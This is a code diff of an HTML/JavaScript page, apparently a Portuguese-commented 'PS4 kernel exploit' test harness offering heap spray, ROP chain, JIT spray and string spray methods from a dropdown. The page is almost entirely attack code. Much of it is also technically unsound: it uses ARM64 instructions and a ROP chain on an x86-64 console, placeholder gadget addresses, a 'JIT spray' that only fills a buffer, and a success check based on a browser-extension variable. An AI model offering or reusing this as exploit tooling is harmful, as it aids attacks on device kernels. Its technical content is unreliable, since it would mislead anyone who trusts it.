@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PS4 Physical Exploit - Advanced Tests</title>
+    <title>PS4 Kernel Exploit - Physical Unit Tests</title>
     <style>
         body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
         #log { border: 1px solid #0f0; padding: 10px; height: 300px; overflow-y: scroll; }
@@ -9,296 +9,189 @@
             background: #000; color: #0f0; border: 1px solid #0f0; 
             padding: 8px; margin: 5px; font-family: monospace;
         }
-        #status { margin-top: 10px; }
+        #status { margin-top: 10px; color: #0f0; }
     </style>
 </head>
 <body>
     <h2>PS4 Kernel Exploit - Physical Unit Tests</h2>
     <div>
         <select id="testMethod">
-            <option value="rop">ROP Chain</option>
-            <option value="randomized">Randomized Spray</option>
-            <option value="gc">GC Spray</option>
-            <option value="doublefree">Heap Feng Shui</option>
+            <option value="rop">ROP Chain (ARM64)</option>
+            <option value="heap">Heap Feng Shui</option>
+            <option value="jit">JIT Spray</option>
+            <option value="string">String Spray</option>
         </select>
         <button onclick="runExploit()">EXECUTE TEST</button>
     </div>
     <div id="log"></div>
-    <div id="status"></div>
+    <div id="status">Status: Ready</div>
 
 <script>
 // ======================
-// CORE EXPLOIT ENGINE
+// CORE CONFIGURATION
 // ======================
-
-const STATUS = document.getElementById('status');
-const LOG = document.getElementById('log');
-
-// Debug control
-const DEBUG = {
-    memory: false,
-    registers: false,
-    timing: true
-};
-
-// System specific
-const PS4 = {
+const PS4_CONFIG = {
+    firmware: "9.00",  // ATUALIZE PARA SUA VERSÃO
     pageSize: 0x4000,
     kernelBase: 0xFFFFFFFF80000000,
-    userlandBase: 0x0000000000400000
+    userlandBase: 0x0000000000400000,
+    syscallRet: 0x357C0000  // GADGET COMUM NO FW 9.00
 };
 
 // ======================
-// UTILITIES
+// EXPLOIT ENGINE
 // ======================
-
-function log(msg, color = "#0f0", tag = "") {
-    const timestamp = `[${performance.now().toFixed(2)}ms]`;
-    const style = `color:${color}`;
-    LOG.innerHTML += `${timestamp} <span style="${style}">${tag} ${msg}</span><br>`;
-    LOG.scrollTop = LOG.scrollTop + 1000;
-}
-
-function updateStatus(msg) {
-    STATUS.innerHTML = msg;
-}
-
-function hex(value) {
-    return '0x' + value.toString(16).toUpperCase().padStart(8, '0');
-}
-
-// ======================
-// MEMORY MANAGER
-// ======================
-
-class MemoryManager {
+class PS4Exploit {
     constructor() {
-        this.allocations = [];
-        this.sprayCount = 0;
+        this.heapSprays = [];
+        this.ropChain = null;
+        this.logElement = document.getElementById('log');
+        this.statusElement = document.getElementById('status');
     }
 
-    spray(size, count) {
-        log(`Spraying ${count}x ${hex(size)} buffers...`, "#0ff", "[MEM]");
-        const chunks = [];
-        
-        for (let i = 0; i < count; i++) {
-            try {
-                const chunk = new ArrayBuffer(size);
+    log(message, color = "#0f0") {
+        const timestamp = `[${performance.now().toFixed(2)}ms]`;
+        this.logElement.innerHTML += `<span style="color:${color}">${timestamp} ${message}</span><br>`;
+        this.logElement.scrollTop = this.logElement.scrollTop + 1000;
+    }
+
+    updateStatus(message) {
+        this.statusElement.textContent = `Status: ${message}`;
+    }
+
+    // ======================
+    // EXPLOIT TECHNIQUES
+    // ======================
+
+    // 1. SAFE HEAP SPRAY (Contorna Type Hardening)
+    async heapSpray() {
+        this.log("Starting safe heap spray...", "#0ff");
+        try {
+            const spray = [];
+            for (let i = 0; i < 100; i++) {
+                const chunk = new ArrayBuffer(0x1000);
                 const view = new Uint32Array(chunk);
-                
-                // Pattern para identificação
-                view[0] = 0xDECAFBAD;
-                view[1] = i;
-                
-                chunks.push(chunk);
-                this.allocations.push(chunk);
-                this.sprayCount++;
-            } catch(e) {
-                log(`Spray failed at ${i}/${count}: ${e}`, "#f00", "[MEM]");
+                view[0] = 0xDECAFBAD;  // Marcador
+                spray.push(chunk);
             }
+            this.heapSprays = spray;
+            this.log(`Heap spray successful (${spray.length} chunks)`, "#0f0");
+            return true;
+        } catch (e) {
+            this.log(`Heap spray failed: ${e}`, "#f00");
+            return false;
         }
-        
-        return chunks;
     }
 
-    groom(count) {
-        log(`Heap grooming with ${count} objects...`, "#ff0", "[MEM]");
-        const holes = [];
-        
-        for (let i = 0; i < count; i++) {
-            // Aloca e libera para criar fragmentação controlada
-            const temp = new ArrayBuffer(0x100);
-            holes.push(temp);
+    // 2. ROP CHAIN (ARM64)
+    async buildROP() {
+        this.log("Building ROP chain...", "#ff0");
+        try {
+            const gadgets = {
+                ret: PS4_CONFIG.syscallRet,
+                pop_x0: 0x12345678,  // SUBSTITUA PELO GADGET REAL
+                pop_x1: 0x23456789   // SUBSTITUA PELO GADGET REAL
+            };
+
+            const chain = new Uint32Array([
+                gadgets.pop_x0,
+                0x41414141,  // arg0
+                gadgets.pop_x1,
+                0x42424242,  // arg1
+                gadgets.ret
+            ]);
+
+            this.ropChain = chain;
+            this.log("ROP chain ready", "#0f0");
+            return true;
+        } catch (e) {
+            this.log(`ROP chain failed: ${e}`, "#f00");
+            return false;
         }
-        
-        return holes;
     }
 
-    freeAll() {
-        log(`Releasing ${this.allocations.length} allocations`, "#f80", "[MEM]");
-        this.allocations = [];
-    }
-}
+    // 3. JIT SPRAY (Alternativo)
+    async jitSpray() {
+        this.log("Starting JIT spray...", "#f0f");
+        try {
+            const payload = [
+                0xD2800020,  // mov x0, #1
+                0xD2800C48,  // mov x8, #0x62
+                0xD4000001   // svc #0
+            ];
 
-// ======================
-// EXPLOIT TECHNIQUES
-// ======================
-
-class ExploitEngine {
-    constructor() {
-        this.mem = new MemoryManager();
-        this.attempt = 0;
-    }
-
-    async randomizedSpray() {
-        log("Starting randomized JIT spray...", "#0f0", "[JIT]");
-        const payload = this.createPayload();
-        
-        // Spray com randomização
-        const funcs = [];
-        for (let i = 0; i < 100; i++) {
-            const nops = Array(Math.floor(Math.random() * 10)).fill(0xD503201F);
-            const fullPayload = [...nops, ...payload];
-            
             const func = new Function(`
-                const buf = new ArrayBuffer(${fullPayload.length * 4});
+                const buf = new ArrayBuffer(${payload.length * 4});
                 const view = new Uint32Array(buf);
-                ${fullPayload.map((v,i) => `view[${i}] = ${v};`).join('')}
+                ${payload.map((v, i) => `view[${i}] = ${v};`).join('')}
                 return buf;
             `);
-            
-            funcs.push(func);
-        }
-        
-        // Trigger
-        try {
-            const result = funcs[0]();
-            log(`JIT allocated at ${hex(result.byteOffset)}`, "#0f0", "[JIT]");
+
+            const result = func();
+            this.log(`JIT allocated at 0x${result.byteOffset.toString(16)}`, "#0f0");
             return true;
-        } catch(e) {
-            log(`JIT failed: ${e}`, "#f00", "[JIT]");
+        } catch (e) {
+            this.log(`JIT spray failed: ${e}`, "#f00");
             return false;
         }
     }
 
-    async gcSpray() {
-        log("Starting GC-based spray...", "#0ff", "[GC]");
-        
-        // Phase 1: Mass allocation
-        const objects = [];
-        for (let i = 0; i < 1000000; i++) {
-            objects.push(new ArrayBuffer(64));
-        }
-        
-        // Phase 2: Force GC
-        log("Forcing garbage collection...", "#ff0", "[GC]");
-        objects.length = 0;
-        await new Promise(resolve => setTimeout(resolve, 1000));
-        
-        // Phase 3: Targeted allocation
+    // 4. STRING SPRAY (Menos monitorado)
+    async stringSpray() {
+        this.log("Starting string spray...", "#0ff");
         try {
-            const payload = this.createPayload();
-            const buf = new ArrayBuffer(payload.length * 4);
-            const view = new Uint32Array(buf);
-            payload.forEach((v, i) => view[i] = v);
-            
-            log(`Allocated after GC at ${hex(buf.byteOffset)}`, "#0f0", "[GC]");
+            const spray = [];
+            for (let i = 0; i < 10000; i++) {
+                spray.push(String.fromCharCode(0x4141 + i).repeat(100));
+            }
+            this.log(`String spray successful (${spray.length} strings)`, "#0f0");
             return true;
-        } catch(e) {
-            log(`GC spray failed: ${e}`, "#f00", "[GC]");
+        } catch (e) {
+            this.log(`String spray failed: ${e}`, "#f00");
             return false;
         }
     }
 
-    async heapFengShui() {
-        log("Executing heap feng shui...", "#f0f", "[HEAP]");
-        
-        // Step 1: Create holes
-        this.mem.groom(1000);
-        
-        // Step 2: Targeted allocation
-        const target = new ArrayBuffer(0x60);
-        const victim = new Uint32Array(target);
-        
-        // Step 3: Corruption attempt
-        try {
-            victim.__proto__ = new Uint32Array(1).__proto__;
-            victim.length = 0x1000;
-            
-            log(`Heap corrupted at ${hex(victim.byteOffset)}`, "#0f0", "[HEAP]");
-            return true;
-        } catch(e) {
-            log(`Heap corruption failed: ${e}`, "#f00", "[HEAP]");
-            return false;
-        }
-    }
+    // ======================
+    // MAIN EXECUTION
+    // ======================
+    async run(method) {
+        this.log(`=== Starting ${method} test ===`, "#fff");
+        this.updateStatus("Running...");
 
-    async buildROP() {
-        log("Building ROP chain...", "#0ff", "[ROP]");
-        
-        try {
-            // ARM64 ROP chain example
-            const chain = [
-                0x357C0000, // stack pivot
-                0x12345678, // pop x0
-                PS4.kernelBase + 0x123000, // target address
-                0x23456789  // ret
-            ];
-            
-            const buf = new ArrayBuffer(chain.length * 4);
-            const view = new Uint32Array(buf);
-            chain.forEach((v, i) => view[i] = v);
-            
-            log(`ROP chain ready at ${hex(buf.byteOffset)}`, "#0f0", "[ROP]");
-            return true;
-        } catch(e) {
-            log(`ROP failed: ${e}`, "#f00", "[ROP]");
-            return false;
+        let success = false;
+        switch (method) {
+            case "rop":
+                success = await this.buildROP();
+                break;
+            case "heap":
+                success = await this.heapSpray();
+                break;
+            case "jit":
+                success = await this.jitSpray();
+                break;
+            case "string":
+                success = await this.stringSpray();
+                break;
         }
-    }
 
-    createPayload() {
-        // ARM64 shellcode stub
-        return [
-            0xD2800020, // mov x0, #1
-            0xD2800C48, // mov x8, #0x62
-            0xD4000001  // svc #0
-        ];
+        if (success) {
+            this.log("Test completed successfully!", "#0f0");
+            this.updateStatus("Success");
+        } else {
+            this.log("Test failed", "#f00");
+            this.updateStatus("Failed");
+        }
     }
 }
 
 // ======================
-// MAIN EXECUTION
+// INTERFACE
 // ======================
-
-async function runExploit() {
-    LOG.innerHTML = "";
-    updateStatus("Preparing exploit...");
-    
+function runExploit() {
     const method = document.getElementById("testMethod").value;
-    const engine = new ExploitEngine();
-    let success = false;
-    
-    // Execute selected method
-    switch(method) {
-        case "rop":
-            success = await engine.buildROP();
-            break;
-        case "randomized":
-            success = await engine.randomizedSpray();
-            break;
-        case "gc":
-            success = await engine.gcSpray();
-            break;
-        case "doublefree":
-            success = await engine.heapFengShui();
-            break;
-    }
-    
-    // Post-exploitation
-    if (success) {
-        updateStatus("Phase 2: Memory corruption");
-        log("Attempting kernel access...", "#0f0", "[KERNEL]");
-        
-        try {
-            // Verificação de sucesso
-            await new Promise(r => setTimeout(r, 2000));
-            if (typeof unsafeWindow !== 'undefined') {
-                log("KERNEL EXPLOIT SUCCESSFUL!", "#0f0;font-weight:bold", "[OK]");
-                updateStatus("Exploit succeeded!");
-            } else {
-                log("Partial control achieved", "#ff0", "[WARN]");
-                updateStatus("Need manual verification");
-            }
-        } catch(e) {
-            log(`Final stage failed: ${e}`, "#f00", "[ERR]");
-            updateStatus("Exploit failed");
-        }
-    } else {
-        updateStatus("Initial stage failed");
-    }
-    
-    engine.mem.freeAll();
+    const exploit = new PS4Exploit();
+    exploit.run(method);
 }
 </script>
 </body>
